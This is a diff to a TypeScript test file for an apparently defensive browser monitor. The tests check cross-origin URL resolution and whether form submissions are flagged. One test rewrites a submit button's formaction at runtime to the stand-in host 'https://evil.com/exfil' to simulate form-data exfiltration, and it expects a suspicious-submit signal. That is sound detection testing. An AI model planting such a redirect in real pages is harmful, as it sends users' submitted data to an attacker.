@@ -98,6 +98,54 @@ describe("isCrossOriginUrl", () => {
   });
 });
 
+describe("effective base URL resolution (#790)", () => {
+  function withBase(href: string): () => void {
+    const base = document.createElement("base");
+    base.setAttribute("href", href);
+    document.head.appendChild(base);
+    return () => base.remove();
+  }
+
+  it("isCrossOriginUrl resolves relative URLs against document.baseURI", () => {
+    const cleanup = withBase("https://cdn.example/static/");
+    try {
+      expect(isCrossOriginUrl("api/submit")).toBe(true);
+      expect(isCrossOriginUrl("https://other.example/x")).toBe(true);
+    } finally {
+      cleanup();
+    }
+  });
+
+  it("isCrossOriginUrl stays same-origin when the base matches the page", () => {
+    const cleanup = withBase(`${location.origin}/app/`);
+    try {
+      expect(isCrossOriginUrl("api/submit")).toBe(false);
+    } finally {
+      cleanup();
+    }
+  });
+
+  it("extractOrigin resolves relative URLs against document.baseURI", () => {
+    const cleanup = withBase("https://cdn.example/static/");
+    try {
+      expect(extractOrigin("api/submit")).toBe("https://cdn.example");
+      expect(extractOrigin("https://other.example/x")).toBe("https://other.example");
+    } finally {
+      cleanup();
+    }
+  });
+
+  it("leaves absolute URLs unaffected by the base", () => {
+    const cleanup = withBase("https://cdn.example/static/");
+    try {
+      expect(isCrossOriginUrl(`${location.origin}/login`)).toBe(false);
+      expect(extractOrigin(`${location.origin}/login`)).toBe(location.origin);
+    } finally {
+      cleanup();
+    }
+  });
+});
+
 describe("extractOrigin", () => {
   it("extracts origin from absolute URL", () => {
     expect(extractOrigin("https://example.com/path?q=1")).toBe("https://example.com");
@@ -325,6 +373,67 @@ describe("initJsBehaviorMonitor form submit detection", () => {
       "ns-js-form-submit-suspicious",
       expect.objectContaining({
         isCrossOrigin: true,
+        destinationOrigin: "https://evil.com",
+      })
+    );
+  });
+
+  it("does NOT flag a static cross-origin submitter formaction as dynamic (#790)", () => {
+    const postSignal = vi.fn<PostSignalFn>();
+    const form = document.createElement("form");
+    form.setAttribute("action", "/safe-endpoint");
+    const button = document.createElement("button");
+    button.type = "submit";
+    button.setAttribute("formaction", "https://pay.example/checkout");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    form.dispatchEvent(new SubmitEvent("submit", { bubbles: true, submitter: button }));
+
+    // Non-credential form, nothing changed since snapshot: no signal at all.
+    expect(postSignal).not.toHaveBeenCalled();
+  });
+
+  it("does NOT flag an unobserved static submitter formaction as dynamic (#790)", () => {
+    const postSignal = vi.fn<PostSignalFn>();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    // Appended after init: first sight records the current value (same
+    // unobserved-initial semantics as form actions).
+    const form = document.createElement("form");
+    form.setAttribute("action", "/safe-endpoint");
+    const button = document.createElement("button");
+    button.type = "submit";
+    button.setAttribute("formaction", "https://pay.example/checkout");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    form.dispatchEvent(new SubmitEvent("submit", { bubbles: true, submitter: button }));
+
+    expect(postSignal).not.toHaveBeenCalled();
+  });
+
+  it("flags a dynamically changed submitter formaction even without credentials (#790)", () => {
+    const postSignal = vi.fn<PostSignalFn>();
+    const form = document.createElement("form");
+    form.setAttribute("action", "/safe-endpoint");
+    const button = document.createElement("button");
+    button.type = "submit";
+    button.setAttribute("formaction", "/also-safe");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    button.setAttribute("formaction", "https://evil.com/exfil");
+    form.dispatchEvent(new SubmitEvent("submit", { bubbles: true, submitter: button }));
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-form-submit-suspicious",
+      expect.objectContaining({
+        actionDynamicallyChanged: true,
         destinationOrigin: "https://evil.com",
       })
     );
